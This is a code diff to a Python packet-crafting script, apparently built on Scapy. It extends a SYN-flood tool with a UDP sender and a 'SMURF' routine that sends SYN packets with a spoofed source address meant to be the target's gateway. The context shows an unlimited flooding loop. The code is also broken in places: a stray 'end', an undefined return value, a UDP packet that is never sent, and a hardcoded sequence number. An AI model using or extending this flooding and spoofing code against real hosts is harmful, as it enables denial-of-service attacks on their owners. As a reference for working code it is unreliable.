@@ -31,12 +31,22 @@ def sendTCP(d, p):
     end
 
 def sendUDP(d, p):
-    #check whether flags or other options are necessary
-    return True
+    a=IP(dst=d)/UDP(sport=RandShort(), dport=p)
+
+def spoofIP(i):
+    #return the gateway of provided IP..~~
+    return b
 
 def sendSMURF(d, p):
-    #Pausing this one, as another active IP is required. Consider using the target's gateway and guessing it to be x.x.x.1'
-    return True
+    s=spoofIP(d)
+    a1=IP(dst=d,src=s)/TCP(flags="S", sport=RandShort(), dport=p)
+    send(a1)
+    #need a function here to get the sequence no.
+    #sq=int(functionToGetSequenceNo)
+    sq=5
+    a2=IP(dst=d,src=s)/TCP(flags="S", sport=RandShort(), dport=p, ack=sq+1, seq=1)
+    send(a2)
+
 
 if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
     while (1 == 1):
